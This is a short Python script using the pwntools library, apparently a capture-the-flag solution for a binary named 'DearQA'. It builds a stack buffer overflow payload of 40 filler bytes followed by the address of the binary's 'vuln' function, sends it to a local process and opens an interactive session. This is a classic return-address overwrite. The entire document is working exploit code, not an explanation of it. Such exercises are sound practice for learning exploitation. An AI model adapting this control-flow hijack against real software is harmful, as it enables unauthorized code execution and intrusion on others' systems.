from pwn import * 

context.binary = binary = "./DearQA.DearQA"
static = ELF(binary)

vuln_address = static.symbols.vuln
vuln_addr = p64(vuln_address)
payload = b'a'*32 + b'b'*8 + vuln_addr

p = process('./DearQA.DearQA')
p.sendline(payload)
p.interactive()
